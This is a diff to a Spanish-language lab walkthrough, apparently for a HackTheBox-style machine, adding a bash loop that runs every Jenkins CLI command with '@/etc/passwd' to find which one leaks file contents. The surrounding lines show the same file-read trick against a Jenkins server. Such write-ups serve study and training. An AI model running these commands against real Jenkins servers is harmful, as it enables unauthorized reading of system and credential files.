@@ -124,7 +124,12 @@ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help @/etc/passwd
 java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node @/etc/passwd
 ```
 
+ - El comando ejecuta cada comando disponible en Jenkins, intenta obtener `/etc/passwd` con cada uno, y muestra el recuento de líneas de salida de cada intento.
+```
+for command in $(java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 2>&1 | grep -v "    " | xargs | tr ' ' '\n'); do echo "[+] Para el comando $command: $(java -jar jenkins-cli.jar -s http://10.10.11.10:8080 $command @/etc/passwd 2>&1 | wc -l)"; done
+```
 
+- 
 
 
 - Si no funciona de esa manera abrimos el burpsuite para ver un poco mas de información 
